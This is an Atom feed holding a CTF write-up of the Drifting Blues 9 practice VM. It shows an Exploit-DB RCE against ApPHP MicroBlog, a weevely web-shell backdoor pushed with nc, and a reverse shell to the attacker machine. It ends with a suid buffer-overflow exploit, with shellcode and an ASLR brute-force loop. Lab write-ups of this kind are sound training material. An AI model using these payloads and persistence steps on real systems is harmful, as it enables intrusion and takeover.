@@ -1,0 +1,722 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <title><![CDATA[devGiants]]></title>
+    <link href="/blog/tags/hack.xml" rel="self"/>
+    <link href="/"/>
+    <updated>2021-07-16T17:03:58+02:00</updated>
+    <id>/</id>
+        <generator uri="http://sculpin.io/">Sculpin</generator>
+            <entry>
+            <title type="html"><![CDATA[Drifting Blues 9 write-up]]></title>
+            <link href="/blog/2021/07/15/drifting-blues-9-writeup/"/>
+            <updated>2021-07-15T10:40:00+02:00</updated>
+            <id>/blog/2021/07/15/drifting-blues-9-writeup/</id>
+            <content type="html"><![CDATA[<p>This is my write-up (my very first !) for Drifting Blues 9 VM, available on <a href="https://hackmyvm.eu/">HackMyVM</a> platform.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>After launching VM, I start as always by evaluate network attack footprint.</p>
+
+<h3 id="finding-vm-ip">Finding VM IP</h3>
+
+<p>My local subnet is in the CIDR range 192.168.1.0/24, I do a <code>nmap</code> quick ping scan</p>
+
+<pre><code># nmap -sn 192.168.1.0/24
+</code></pre>
+
+<p>Among another known hosts, the VM popped up :</p>
+
+<pre><code># nmap -sn 192.168.1.0/24
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:08 EDT
+...
+Nmap scan report for debian.home (192.168.1.30)
+Host is up (0.00090s latency).
+MAC Address: 01:23:45:67:89:AB (Oracle VirtualBox virtual NIC)
+...
+Nmap done: 256 IP addresses (X hosts up) scanned in 2.11 seconds
+
+</code></pre>
+
+<p>The target machine is already name <code>debian.home</code>, no need to amend <code>/etc/hosts</code> for giving convenient name.</p>
+
+<h3 id="port-enumeration">Port enumeration</h3>
+
+<p>Now I focus on this target, by examining ports status :</p>
+
+<pre><code>nmap debian.home -p-
+</code></pre>
+
+<p>This will perform :
+- A complete port scan, on all ports range (2<sup>16</sup>, 65535)
+- Using TCP SYN port scan
+- With normal timing (3)</p>
+
+<pre><code># nmap debian.home -p-
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:20 EDT
+Nmap scan report for debian.home (192.168.1.30)
+Host is up (0.00011s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+40592/tcp open  unknown
+MAC Address: 08:00:27:6A:29:81 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
+</code></pre>
+
+<h2 id="web-part">Web part</h2>
+
+<p>Something is on 80, probably a webapp. Here is the homepage :</p>
+
+<p><img src="https://imgur.com/oYUSdHl.png" alt="Web app homepage" /></p>
+
+<p>Looks like another blogging platform, with one article.</p>
+
+<h3 id="about-structure">About structure</h3>
+
+<p>I try to find unreferenced files or backups. As it is php application
+(click on 'Category 1' on right drives me to http://debian.home/index.php?page=posts&amp;cat_id=1),
+I focus on related extensions :</p>
+
+<pre><code>gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
+</code></pre>
+
+<p><code>gobuster</code> is a powerful directory/file enumerator. Here :
+- Put it in directory/file enumeration mode.
+- Use widely known directories list from <code>dirbuster</code> (available in Kali), the medium size one.
+- Focus on <code>php</code>, <code>html</code>, <code>txt</code> and <code>bak</code> extensions (for sniffing automatic backup files)</p>
+
+<pre><code># gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://debian.home
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,bak,txt
+[+] Timeout:                 10s
+===============================================================
+2021/07/16 03:32:16 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 311] [--&gt; http://debian.home/images/]
+/index.php            (Status: 200) [Size: 5650]
+/docs                 (Status: 301) [Size: 309] [--&gt; http://debian.home/docs/]
+/page                 (Status: 301) [Size: 309] [--&gt; http://debian.home/page/]
+/header.php           (Status: 200) [Size: 13]
+/admin                (Status: 301) [Size: 310] [--&gt; http://debian.home/admin/]
+/footer.php           (Status: 500) [Size: 614]
+/license              (Status: 301) [Size: 312] [--&gt; http://debian.home/license/]
+/README.txt           (Status: 200) [Size: 975]
+/js                   (Status: 301) [Size: 307] [--&gt; http://debian.home/js/]
+/include              (Status: 301) [Size: 312] [--&gt; http://debian.home/include/]
+/backup               (Status: 301) [Size: 311] [--&gt; http://debian.home/backup/]
+/styles               (Status: 301) [Size: 311] [--&gt; http://debian.home/styles/]
+/INSTALL.txt          (Status: 200) [Size: 1201]
+/wysiwyg              (Status: 301) [Size: 312] [--&gt; http://debian.home/wysiwyg/]
+/server-status        (Status: 403) [Size: 276]
+/mails                (Status: 301) [Size: 310] [--&gt; http://debian.home/mails/]
+
+===============================================================
+2021/07/16 03:36:12 Finished
+===============================================================
+</code></pre>
+
+<p>Strange, some directories popped up. Let's go to the <code>admin</code> one, http://debian.home/images :</p>
+
+<p><img src="https://imgur.com/6cmw9ki.png" alt="Image directory" /></p>
+
+<p>Seems directory indexes are allowed ! With this information, I can wander and gather precious informations
+on site structure. I open http://debian.home/includes, you can see and find all *.php files.</p>
+
+<p>Another point of interest : INSTALL.txt</p>
+
+<p>http://debian.home/INSTALL.txt</p>
+
+<pre><code>///////////////////////////////////////////////////////////////////////////////////
+//
+// Advanced Power of PHP
+// ---------------------
+// http://www.apphp.com
+//
+// ApPHP MicroBlog Free
+//
+// Version: 1.0.1
+//
+///////////////////////////////////////////////////////////////////////////////////
+
+Software requirements: PHP 5.0 or later version.
+
+To install ApPHP MicroBlog, you should have to extract the ApPHP MicroBlog ZIP file.
+It depends on the operating system you use.
+Once extracted, you will have a directory containing the ApPHP MicroBlog script.
+
+Upload all content of this directory to your webserver, either by copying the
+directory or by using an FTP program.
+
+Then you will need to run the installation module.
+To do this you need to open a browser and type in the URL:
+
+If you are running on your own computer, this will be
+
+   http://localhost/{micro-blog directory}/install.php
+
+or if on a live server:
+
+   http://{www.mydomain.com}/install.php
+
+On this page you need:
+
+1. Enter connection parameters:
+   database host, database name, username, password.
+
+2. Enter admin login and admin password, that you will use to administer the site.
+</code></pre>
+
+<p>Multiples informations here :
+- <code>install.php</code> is mentioned but not found
+- Web app system is ApPHP MicroBlog Free, version 1.0.1</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Quick <code>searchsploit</code> looks promising :</p>
+
+<pre><code># searchsploit apphp 1.0.1
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                    | php/webapps/33030.txt
+ApPHP MicroBlog 1.0.1 - Remote Command Execution                                    | php/webapps/33070.py
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre>
+
+<p>Let's examine RCE. It's a python script that take in as argument the site URL running ApPHP webapp.
+It should send back a shell.</p>
+
+<pre><code># searchsploit -x 33070
+  Exploit: ApPHP MicroBlog 1.0.1 - Remote Command Execution
+      URL: https://www.exploit-db.com/exploits/33070
+     Path: /usr/share/exploitdb/exploits/php/webapps/33070.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+</code></pre>
+
+<p>Run the exploit :</p>
+
+<ul>
+<li>It's a Python 2.X script only</li>
+<li>It's mandatory to provide <code>index.php</code></li>
+</ul>
+
+<pre><code># python2.7 /usr/share/exploitdb/exploits/php/webapps/33070.py http://debian.home/index.php
+
+ -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
+original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
+[*] Testing for vulnerability...
+[+] Website is vulnerable
+
+[*] Fecthing phpinfo
+    PHP Version 5.6.40-0+deb8u12
+    System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
+    Loaded Configuration File   /etc/php5/apache2/php.ini
+    Apache Version   Apache/2.4.10 (Debian)
+    User/Group   www-data(33)/33
+    Server Root   /etc/apache2
+    DOCUMENT_ROOT   /var/www/html
+    PHP Version   5.6.40-0+deb8u12
+    allow_url_fopen  On  On
+    allow_url_include  Off  Off
+    disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
+    open_basedir   no value    no value
+    System V Message based IPC   Wez Furlong
+    System V Semaphores   Tom May
+    System V Shared Memory   Christian Cartus
+
+[*] Fetching include/base.inc.php
+&lt;?php
+            // DATABASE CONNECTION INFORMATION
+            define('DATABASE_HOST', 'localhost');           // Database host
+            define('DATABASE_NAME', 'microblog');           // Name of the database to be used
+            define('DATABASE_USERNAME', 'clapton'); // User name for access to database
+            define('DATABASE_PASSWORD', 'yaraklitepe'); // Password for access to database
+            define('DB_ENCRYPT_KEY', 'p52plaiqb8');     // Database encryption key
+            define('DB_PREFIX', 'mb101_');          // Unique prefix of all table names in the database
+            ?&gt;
+
+[*] Testing remote execution
+[+] Remote exec is working with system() :)
+Submit your commands, type exit to quit
+&gt;
+</code></pre>
+
+<p>So I have a shell. I also have as a banner a dump of <code>base.inc.php</code> file and some informations
+related to PHP version a command execution mode.</p>
+
+<p>As we entered by regular PHP app, we logically are <code>www-data</code> :</p>
+
+<pre><code>&gt; whoami
+www-data
+&gt;
+</code></pre>
+
+<h3 id="immediate-connection-persistence">Immediate connection persistence</h3>
+
+<h4 id="backdoor-creation-%3A-%60weevely%60">Backdoor creation : <code>weevely</code></h4>
+
+<p>Let's put a backdoor to ensure permanent connection, even in case flaw would be corrected.
+We use <a href="https://github.com/epinna/weevely3">weevely</a>, which allow some builtin commands, obfuscation,
+and some auto-completion.</p>
+
+<p><em>Note : the shell provided does not have TTY, we'll see later how to workaround</em>.</p>
+
+<p>On my hacking machine, I generate a backdoor :</p>
+
+<pre><code>#`weevely`generate pass ./shell.php
+</code></pre>
+
+<p>Let's find a place where we can put our backdoor.
+In the shell provided by exploit, simple <code>ls -la</code> show that <code>/var/www/html</code> seems to be owned by <code>root:root</code>.</p>
+
+<p>Let's take a step upper and find all writable directories by current user (<code>www-data</code>) :</p>
+
+<pre><code>&gt; find / -writable | grep -v -E "proc|dev"
+
+...
+/var/www/html/include
+...
+&gt;
+</code></pre>
+
+<p>Among other results, we found that <strong>only one directory in Apache exposed stucture is writable</strong>. It is mandatory
+to push the backdoor in HTTP-reachable point, in order to use it. This is the good place.</p>
+
+<h4 id="backdoor-sending">Backdoor sending</h4>
+
+<p>Let's create a reverse shell, not redirected to bash, but where in and out streams are from and to files</p>
+
+<h5 id="on-hacking-machine">On hacking machine</h5>
+
+<p><code>nc -lnvp 10000 &lt; ./shell.php</code></p>
+
+<p>When a connection will occurs, the <code>./shell.php</code> file content will be sent</p>
+
+<h5 id="on-vm">On VM</h5>
+
+<p><code>nc 192.168.1.26 10000 &gt; /var/www/html/include/shell.php</code></p>
+
+<p>This assumes that my hacking machine is reachable at <code>192.168.1.26</code></p>
+
+<p>When transfer is done, <code>CTRL+C</code> both side of connection.</p>
+
+<h4 id="backdoor-usage">Backdoor usage</h4>
+
+<pre><code>weevely http://debian.home/include/shell.php pass
+
+[+]`weevely`4.0.1
+
+[+] Target: debian.home
+[+] Session:    /root/.weevely/sessions/debian.home/shell_0.session
+
+[+] Browse the filesystem or execute commands starts the connection
+[+] to the target. Type :help for more information.
+
+weevely&gt;
+</code></pre>
+
+<p>Here we are permanently connected.</p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>Try to find other interesting users :</p>
+
+<pre><code>weevely&gt; :audit_etcpasswd
+...
+clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
+...
+</code></pre>
+
+<p>This must be the user to reach for owning <code>user.txt</code>.</p>
+
+<h3 id="trying-to-break-in-%60clapton%60">Trying to break in <code>clapton</code></h3>
+
+<p>Nothing obvious (to me) at this point. So using<code>weevely``:file_upload</code> command, I uploaded <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"><code>linpeas.sh</code></a>.</p>
+
+<p>But for comfortably running linpeas, or even run <code>su</code> command, a TTY shell is required,
+which is unfortunatly not the case with weevely.</p>
+
+<h4 id="spawn-a-tty-shell">Spawn a TTY shell</h4>
+
+<ul>
+<li>on my hacking machine, <code>nc -lnvp 10000</code> : connection opening on 10000</li>
+<li>on VM, use another<code>weevely</code>command : <code>:backdoor_reversetcp kali 10000</code></li>
+</ul>
+
+<p>Now, several methods exists for spawning shell with TTY, I used the latter (to be runned on VM) :</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></p>
+
+<p>Followed by <code>export TERM=xterm</code> and now I have a "real" shell;</p>
+
+<h4 id="linpeas.sh">Linpeas.sh</h4>
+
+<p>I run it : <code>./linpeas.sh &gt; /tmp/results.log</code>
+Here again, nothing seemed relevant in report. It suggests to try user = password.</p>
+
+<p><code>~ su clapton</code> with "clapton" as password failed.</p>
+
+<p>I tried then with the database password (found in <code>/var/www/html/include/base.inc.php</code>)</p>
+
+<p>Bingo :) ! got to <code>/home/clapton</code> and flag <code>user.txt</code>.</p>
+
+<h2 id="getting-root">Getting root</h2>
+
+<p>Home directory content :</p>
+
+<pre><code>clapton@debian:~$ ls -la
+ls -la
+total 24
+dr-x------ 2 clapton clapton 4096 May  9 17:13 .
+drwxr-xr-x 3 root    root    4096 May  9 16:57 ..
+-rwsr-xr-x 1 root    root    5150 Sep 22  2015 input
+-rwxr-xr-x 1 root    root     201 May  9 17:15 note.txt
+-rw-r--r-- 1 clapton clapton   32 May  9 17:21 user.txt
+</code></pre>
+
+<p><code>note.txt</code> leads to buffer overflow (this VM is tagged as easy...). I spotted that it is suid, and owned by root.
+So <strong>any execution will use root privileges instead of the current user ones</strong>.</p>
+
+<h3 id="buffer-overflow">Buffer overflow</h3>
+
+<p>Basic calls :</p>
+
+<pre><code>clapton@debian:~$ ./input
+./input
+Syntax: ./input &lt;input string&gt;
+</code></pre>
+
+<p>There is a parameter, that must be put in buffer, that can be overflowed.</p>
+
+<pre><code>clapton@debian:~$ ./input 1111
+./input 1111
+</code></pre>
+
+<h4 id="decompilation">Decompilation</h4>
+
+<p>I retrieve the executable to my hacking machine by putting it in <code>/var/www/html/include</code>
+(using<code>weevely</code>and www-data user). So after I can regularily download it.</p>
+
+<p>Feeding it to <a href="https://ghidra-sre.org/">GHIDRA</a>, here is <code>main</code> function decompiled :</p>
+
+<pre><code class="c">int main(int argc,char **argv)
+{
+  char local_af [171];
+
+  if (argc &lt; 2) {
+    printf("Syntax: %s &lt;input string&gt;\n",*argv);
+    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  strcpy(local_af,argv[1]);
+  return 0;
+}
+</code></pre>
+
+<p>Vulnerable buffer is <code>local_af</code>, and size is 171.</p>
+
+<h5 id="alternative-for-finding-buffer-size%2C-without-ghidra-and-on-target">Alternative for finding buffer size, without GHIDRA and on target</h5>
+
+<pre><code>clapton@debian:~$ gdb ./input
+(gdb) info functions
+    info functions
+    All defined functions:
+
+    Non-debugging symbols:
+    0x080482d4  _init
+    0x08048310  printf@plt
+    0x08048320  strcpy@plt
+    0x08048330  __gmon_start__@plt
+    0x08048340  exit@plt
+    0x08048350  __libc_start_main@plt
+    0x08048360  _start
+    0x08048390  __x86.get_pc_thunk.bx
+    0x080483a0  deregister_tm_clones
+    0x080483d0  register_tm_clones
+    0x08048410  __do_global_dtors_aux
+    0x08048430  frame_dummy
+    0x0804845d  main
+    0x080484b0  __libc_csu_init
+    0x08048520  __libc_csu_fini
+    0x08048524  _fini
+
+</code></pre>
+
+<p>Now disassemble main :</p>
+
+<pre><code>(gdb) disass main
+    disass main
+    Dump of assembler code for function main:
+       0x0804845d &lt;+0&gt;:     push   %ebp
+       0x0804845e &lt;+1&gt;:     mov    %esp,%ebp
+       0x08048460 &lt;+3&gt;:     and    $0xffffff&gt;
+       0x08048463 &lt;+6&gt;:     sub    $0xb0,%esp
+       0x08048469 &lt;+12&gt;:    cmpl   $0x1,0x8(&gt;
+       0x0804846d &lt;+16&gt;:    jg     0x8048490&gt;
+       0x0804846f &lt;+18&gt;:    mov    0xc(%ebp)&gt;
+       0x08048472 &lt;+21&gt;:    mov    (%eax),%e&gt;
+       0x08048474 &lt;+23&gt;:    mov    %eax,0x4(&gt;
+       0x08048478 &lt;+27&gt;:    movl   $0x804854&gt;
+       0x0804847f &lt;+34&gt;:    call   0x8048310&gt;
+       0x08048484 &lt;+39&gt;:    movl   $0x0,(%es&gt;
+       0x0804848b &lt;+46&gt;:    call   0x8048340&gt;
+       0x08048490 &lt;+51&gt;:    mov    0xc(%ebp)&gt;
+       0x08048493 &lt;+54&gt;:    add    $0x4,%eax
+       0x08048496 &lt;+57&gt;:    mov    (%eax),%e&gt;
+       0x08048498 &lt;+59&gt;:    mov    %eax,0x4(&gt;
+       0x0804849c &lt;+63&gt;:    lea    0x11(%esp&gt;
+       0x080484a0 &lt;+67&gt;:    mov    %eax,(%es&gt;
+       0x080484a3 &lt;+70&gt;:    call   0x8048320&gt;
+       0x080484a8 &lt;+75&gt;:    mov    $0x0,%eax
+       0x080484ad &lt;+80&gt;:    leave
+       0x080484ae &lt;+81&gt;:    ret
+</code></pre>
+
+<p>Assembler code states that buffer size is 0xB0 (<code>sub    $0xb0,%esp</code>), which is decimal 176.
+Though we know that the real number is 171. Why this difference? According to my searches, it seems that GDB pads buffers
+size by 16 bits. So 171 become 176 (the next 16 bits block).</p>
+
+<p>In Kali, one can use some Metasploit tools
+(<a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">pattern_create</a>
+and <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb">pattern_offset</a>):</p>
+
+<pre><code># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</code></pre>
+
+<p>Now, in GDB (on VM) :</p>
+
+<pre><code>(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Program received signal SIGSEGV, Segmentation fault.
+    0x41376641 in ?? ()
+</code></pre>
+
+<p>SEGFAULT happened because we overflowed the buffer. With <code>pattern_offset</code>, one can now find precisely the buffer size :</p>
+
+<p>In Kali</p>
+
+<pre><code># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41376641
+[*] Exact match at offset 171
+</code></pre>
+
+<p>Here again, 171.</p>
+
+<h4 id="exploitation">Exploitation</h4>
+
+<p>I found on exploit DB a Linux <code>/bin/sh</code> exec : <a href="https://www.exploit-db.com/exploits/13357">13357</a></p>
+
+<h5 id="first-payload">First payload</h5>
+
+<ul>
+<li>Find size, python len() : 55 bytes</li>
+<li>Order we want : NOP + SHELLCODE + PAD + EIP</li>
+<li>171 - 55 = 116, let's divide both side</li>
+<li>58 bytes NOP</li>
+<li>58 bytes PAD</li>
+</ul>
+
+<p>Code (exploit_1.py):</p>
+
+<pre><code class="python">import struct
+pad = "\x41" * 58
+EIP = struct.pack("I", 0xbfe0e210)
+
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+NOP = "\x90" * 58
+print NOP + shellcode + pad + EIP
+</code></pre>
+
+<ul>
+<li>Fill with 'A'</li>
+<li><code>struct.pack</code> is useful for little-endianing addresses (bytes inversion)</li>
+</ul>
+
+<p>Then I can push <code>exploit_1.py</code> to VM by using <code>:file_upload``weevely</code>command</p>
+
+<h5 id="return-address-to-put-in-eip">Return address to put in EIP</h5>
+
+<p>For finding return address :</p>
+
+<pre><code>(gdb) run $(python /tmp/exploit_1.py)
+Program received signal SIGSEGV, Segmentation fault.
+    0xc042dc78 in ?? ()
+</code></pre>
+
+<p>Then look the resulting stack :</p>
+
+<pre><code>(gdb) x/100x $esp-200
+x/100x $esp-200
+0xbf9f3558: 0x00000000  0x080484a8  0xbf9f3571  0xbf9f3cdc
+0xbf9f3568: 0x00000000  0xb773db48  0x90909001  0x90909090
+0xbf9f3578: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbf9f3588: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbf9f3598: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbf9f35a8: 0x31909090  0xb0db31c0  0x5380cd06  0x74742f68
+0xbf9f35b8: 0x642f6879  0xe3897665  0xb966c931  0x05b02712
+0xbf9f35c8: 0xc03180cd  0x2f2f6850  0x2f686873  0x896e6962
+0xbf9f35d8: 0x895350e3  0x0bb099e1  0x414180cd  0x41414141
+0xbf9f35e8: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbf9f35f8: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbf9f3608: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbf9f3618: 0x41414141  0xc042dc78  0x00000000  0xbf9f36b4
+0xbf9f3628: 0xbf9f36c0  0xb774fe9a  0x00000002  0xbf9f36b4
+0xbf9f3638: 0xbf9f3654  0x0804974c  0x0804821c  0xb7732000
+0xbf9f3648: 0x00000000  0x00000000  0x00000000  0x135ab3f4
+0xbf9f3658: 0x965b37e5  0x00000000  0x00000000  0x00000000
+0xbf9f3668: 0x00000002  0x08048360  0x00000000  0xb77556e0
+0xbf9f3678: 0xb75db639  0xb7762000  0x00000002  0x08048360
+0xbf9f3688: 0x00000000  0x08048381  0x0804845d  0x00000002
+0xbf9f3698: 0xbf9f36b4  0x080484b0  0x08048520  0xb7750350
+0xbf9f36a8: 0xbf9f36ac  0x0000001c  0x00000002  0xbf9f3cc8
+0xbf9f36b8: 0xbf9f3cdc  0x00000000  0xbf9f3d8c  0xbf9f3db9
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+
+</code></pre>
+
+<p><code>0xbf9f3588</code> seems to be a good address candidate for jumping into the <a href="https://en.wikipedia.org/wiki/NOP_slide">NOP seld</a></p>
+
+<p>I tried to send it again, and got resulting stack :</p>
+
+<pre><code>(gdb) x/100x $esp-200
+x/100x $esp-200
+0xbfc6c468: 0x00000000  0x080484a8  0xbfc6c481  0xbfc6dcdc
+0xbfc6c478: 0x00000000  0xb77a5b48  0x90909001  0x90909090
+0xbfc6c488: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbfc6c498: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbfc6c4a8: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbfc6c4b8: 0x31909090  0xb0db31c0  0x5380cd06  0x74742f68
+0xbfc6c4c8: 0x642f6879  0xe3897665  0xb966c931  0x05b02712
+0xbfc6c4d8: 0xc03180cd  0x2f2f6850  0x2f686873  0x896e6962
+0xbfc6c4e8: 0x895350e3  0x0bb099e1  0x414180cd  0x41414141
+0xbfc6c4f8: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbfc6c508: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbfc6c518: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbfc6c528: 0x41414141  0xc042dc78  0x00000000  0xbfc6c5c4
+0xbfc6c538: 0xbfc6c5d0  0xb77b7e9a  0x00000002  0xbfc6c5c4
+0xbfc6c548: 0xbfc6c564  0x0804974c  0x0804821c  0xb779a000
+0xbfc6c558: 0x00000000  0x00000000  0x00000000  0x56222d49
+0xbfc6c568: 0x13c58958  0x00000000  0x00000000  0x00000000
+0xbfc6c578: 0x00000002  0x08048360  0x00000000  0xb77bd6e0
+0xbfc6c588: 0xb7643639  0xb77ca000  0x00000002  0x08048360
+0xbfc6c598: 0x00000000  0x08048381  0x0804845d  0x00000002
+0xbfc6c5a8: 0xbfc6c5c4  0x080484b0  0x08048520  0xb77b8350
+0xbfc6c5b8: 0xbfc6c5bc  0x0000001c  0x00000002  0xbfc6dcc8
+0xbfc6c5c8: 0xbfc6dcdc  0x00000000  0xbfc6dd8c  0xbfc6ddb9
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+</code></pre>
+
+<p>0xbfc6c488 - 0xbf9f3588 = 278F00. Such big distance can lead to <a href="https://fr.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> enabled.</p>
+
+<p>How to check :</p>
+
+<pre><code>clapton@debian:~$ cat /proc/sys/kernel/randomize_va_space
+cat /proc/sys/kernel/randomize_va_space
+2
+</code></pre>
+
+<p>Damned ! "2" means it is enabled, so we can't predict with reasonable error the jumping address.</p>
+
+<h5 id="second-payload-%3A-repetition">Second payload : repetition</h5>
+
+<p>Now the idea is <strong>to repeat the program execution with a payload that will maximize chance for
+our return address to target in NOP sled</strong>.</p>
+
+<p>As the stack location is random in memory each execution, I will create loop with "enough" tries (try and mistake mode)
+in order to force the probability of my address pointing in NOP sled to occur.</p>
+
+<p>So I need a different payload :</p>
+
+<pre><code class="python">import struct
+pad = "\x41" * 171
+EIP = struct.pack("I", 0xbfe0e210)
+
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31&gt;
+NOP = "\x90" * 20000
+print pad + EIP + NOP + shellcode
+</code></pre>
+
+<ul>
+<li>Fill all the buffer with 'A'</li>
+<li>Put last address inside EIP target</li>
+<li>Shellcode</li>
+<li>Massive NOP sled : 20000</li>
+</ul>
+
+<p>Order is also different in order to be unlimited in NOP sled size.</p>
+
+<p>I uploaded it with <code>weevely</code> using <code>:file_upload</code> command, named <code>exploit_aslr.py</code></p>
+
+<p>First try on VM:</p>
+
+<pre><code>clapton@debian:~$ for i in {0..100}; do ./input $(/tmp/exploit_aslr.py): done
+Segmentation fault
+Segmentation fault
+Segmentation fault
+...
+clapton@debian:~$
+
+</code></pre>
+
+<p>Unlucky. Second try, with 1000 occurences :</p>
+
+<pre><code>clapton@debian:~$ for i in {0..1000}; do ./input $(/tmp/exploit_aslr.py): done
+Segmentation fault
+Segmentation fault
+Segmentation fault
+...
+#
+</code></pre>
+
+<p>Got it ! The <code>#</code> indicates we are root :</p>
+
+<pre><code># whoami
+whoami
+root
+#
+</code></pre>
+
+<p>Now I can flag the <code>root.txt</code>.</p>
+
+<h2 id="deadends">Deadends</h2>
+
+<h3 id="web-app">Web app</h3>
+
+<ul>
+<li>Using weevely, start SQL console and search for admin credentials.</li>
+<li>It is encrypted, find in <code>var/www/html/include/classes/Accounts.class.php</code> that is AES encryption
+with salt.</li>
+<li>Update admin password : <code>update microblog.mb101_accounts set password = AES_ENCRYPT('pass','p52plaiqb8') WHERE id = 1;</code></li>
+<li>Logged as admin... Nothing !</li>
+</ul>
+
+<h3 id="rpc">RPC</h3>
+
+<p>Initial <code>nmap</code> scan showed 111/tcp opened. Wander for RPC (especially NFS misconfiguration), but I found nothing.</p>
+
+<pre><code>111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          39735/udp6  status
+|   100024  1          48044/udp   status
+|   100024  1          59229/tcp   status
+|_  100024  1          59230/tcp6  status
+</code></pre>
+]]></content>
+        </entry>
+    </feed>
